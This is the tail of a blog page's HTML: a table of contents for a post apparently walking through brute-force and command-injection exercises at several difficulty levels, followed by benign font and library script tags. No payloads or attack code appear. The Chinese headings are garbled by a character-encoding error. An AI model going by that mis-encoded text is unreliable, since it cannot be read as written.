<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">ç›®å½•</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#å‰è¨€>å‰è¨€</a></li>
<li><a href=#brute-force>Brute Force</a>
<ol>
<li><a href=#ä¿¡æ¯æ”¶é›†>ä¿¡æ¯æ”¶é›†</a></li>
<li><a href=#å‡†å¤‡>å‡†å¤‡</a></li>
<li><a href=#ç¼–å†™è„šæœ¬>ç¼–å†™è„šæœ¬</a></li>
<li><a href=#æé«˜éš¾åº¦>æé«˜éš¾åº¦</a></li>
</ol>
</li>
<li><a href=#command-injection>Command Injection</a>
<ol>
<li><a href=#ä¿¡æ¯æ”¶é›†-1>ä¿¡æ¯æ”¶é›†</a></li>
<li><a href=#å‡†å¤‡-1>å‡†å¤‡</a></li>
<li><a href=#æ„é€ -payload>æ„é€  payload</a></li>
<li><a href=#æé«˜éš¾åº¦medium>æé«˜éš¾åº¦ï¼šMedium</a></li>
<li><a href=#æé«˜éš¾åº¦high>æé«˜éš¾åº¦ï¼šHigh</a></li>
</ol>
</li>
<li><a href=#æ€»ç»“>æ€»ç»“</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>